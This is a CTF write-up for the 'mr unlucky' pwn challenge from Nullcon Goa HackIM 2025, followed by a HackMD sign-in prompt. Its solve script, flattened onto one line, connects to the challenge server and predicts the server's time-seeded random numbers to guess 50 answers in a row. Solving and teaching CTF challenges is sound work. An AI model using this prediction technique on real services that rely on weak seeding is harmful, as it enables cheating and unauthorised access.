---
title: "mr unlucky - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
type: "writeup"
tags: ["pwn", "unlucky", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "from pwn import  import time import ctypes context.arch = 'amd64' elf = ELF('meunlucky') heroes = [ \"Anti-Mage\", \"Axe\", \"Bane\", \"Bloodseeker\", \"Crystal Maiden\", \"Drow Ranger\", \"Earthshaker\", \"Juggerna"
source:
  name: "CTFtime writeup #39970"
  url: "https://ctftime.org/writeup/39970"
original_source: "https://hackmd.io/@MnZaZUYBR32K0Fourl72wA/SJMmhyLFye"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "mr unlucky"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** mr unlucky
- **Author team:** volticks_fanClub
- **CTFtime:** <https://ctftime.org/writeup/39970>
- **Original writeup:** <https://hackmd.io/@MnZaZUYBR32K0Fourl72wA/SJMmhyLFye>

---
from pwn import * import time import ctypes context.arch = 'amd64' elf = ELF('me_unlucky') heroes = [ "Anti-Mage", "Axe", "Bane", "Bloodseeker", "Crystal Maiden", "Drow Ranger", "Earthshaker", "Juggernaut", "Mirana", "Morphling", "Phantom Assassin", "Pudge", "Shadow Fiend", "Sniper", "Storm Spirit", "Sven", "Tiny", "Vengeful Spirit", "Windranger", "Zeus", ] r = remote('52.59.124.14', 5021) libc = ctypes.CDLL(None) libc.srand(int(time.time())) r.recvuntil(b'names?') for k in range(50): hero = heroes[libc.rand() % 20] r.recvuntil(b'!!!)') r.sendline(hero) print(r.recvall()) r.interactive()

×

### Sign in

or

[ ![](https://hackmd.io/social/google.svg) Sign in via Google  ](https://hackmd.io/auth/google) [ ![](https://hackmd.io/social/facebook.svg) Sign in via Facebook  ](https://hackmd.io/auth/facebook) [ ![](https://hackmd.io/social/x.svg) Sign in via X(Twitter)  ](https://hackmd.io/auth/twitter) [ ![](https://hackmd.io/social/github.svg) Sign in via GitHub  ](https://hackmd.io/auth/github) [ ![](https://hackmd.io/social/dropbox.svg) Sign in via Dropbox  ](https://hackmd.io/auth/dropbox) ![](https://hackmd.io/images/wallet.svg) Sign in with Wallet  Wallet (  )  __ Connect another wallet  Continue with a different method 

New to HackMD? [Sign up](https://hackmd.io/join)

By signing in, you agree to our [terms of service](https://hackmd.io/s/terms).
